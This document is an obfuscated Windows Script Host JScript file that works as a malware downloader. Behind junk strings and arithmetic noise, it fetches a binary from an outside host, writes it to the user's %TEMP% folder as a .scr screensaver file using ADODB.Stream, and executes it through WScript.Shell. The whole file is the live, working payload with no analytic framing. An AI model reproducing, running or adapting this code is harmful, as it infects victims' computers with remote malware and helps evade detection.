ballastAdaptation = (((((([+!+[]])) + "" + (([!+[] + !+[]] * [!+[] + !+[] + !+[]] + 1)))) * ([!+[] + !+[]]) * ([!+[] + !+[]]) * ([!+[] + !+[] + !+[]])), this);
autonomousBlockade = ("portal", "Run");
massiveInspection = ballastAdaptation[("interpret", "attestation", "WScript")];
massiveInspection[("injection", "criteria", "commerce", "nose", "Sleep")](((458 + 8980) ^ 5 * 5 * 31 * 5 * 2));
universalSymbol = massiveInspection[("guest", "CreateObject")](("WScript.Shell"));
standardMandate = universalSymbol[("ExpandEnvironmentStrings")](("%TEMP%/")) + ("amorphousClub") + ("reservoir", "inflation", "model", "natural", ".scr");
airplaneObligation = ballastAdaptation[("firm", "yacht", function String.prototype.barrierNavigate() {
				return this
}, "partner", "WScript")][("technical", "CreateObject")](("preservative", "identical", "automatic", "person", "MSXML2.XMLHTTP"));
airplaneObligation[("liberal", "solo", "open")](("humane", "serious", "transport", "lexicon", "GET"), ("stimulus", "banana", "manager", "clan", "http://zarabotoknasayte.zz.mu/7/sh87hg5v4"), !((([!+[] + !+[]]) * ([!+[] + !+[] + !+[]])) == ((((Math.pow(11, (([!+[] + !+[]]))) - (9 ^ 124)) + (1 * (1 * 2))) + (((1 | 0) * (1)) * ((1 & 0) | (([+[]]))))) & ((((25 ^ 142), (Math.pow(132, 2) - 17352)) | ((798 / 6) - (122, 215, 59))), (((0 ^ 11) * (56 - 51) + (7 + 1)) & (([!+[] + !+[]]) * (((([!+[] + !+[] + !+[]])) + "" + (([+!+[]])))))), ((2 + 0) * (1 * 2) + ((95, 49) - 47))))));
airplaneObligation[("delegation", "director", "send")]();
while (airplaneObligation[("symbol", "readystate")] < ((72 + 12) / (2 * 10 + 1))) {
				ballastAdaptation[("statue", "printer", "cursive", "WScript")][("taboo", "refrigerator", "Sleep")](((163, 68, 39) + 61));
}
modalMile = ballastAdaptation[("impression", "identical", "WScript")][("season", "CreateObject")](("magazine", "ADODB.Stream"));
try {
				modalMile[("open")]();
				modalMile[("blank", "terrace", "type")] = ((6 + 32) / (100 - 62));
				modalMile[("ampere", "balance", "monster", "strategic", "write")](airplaneObligation[("angel", "technical", "colony", "ResponseBody")]);
				modalMile[("document", "presumption", "substance", "position", "position")] = (1 & 0);
				modalMile[("paste", "decoration", "information", "saveToFile")](standardMandate, ((1 & 1) * 2));
				modalMile[("project", "hall", "ground", "close")]();
				universalSymbol[autonomousBlockade](standardMandate.barrierNavigate(), (0 ^ (0 & 0)), (5 * 5 * 2 - (Math.pow(66, 2) - 4306)));
} catch (bomberArgument) {};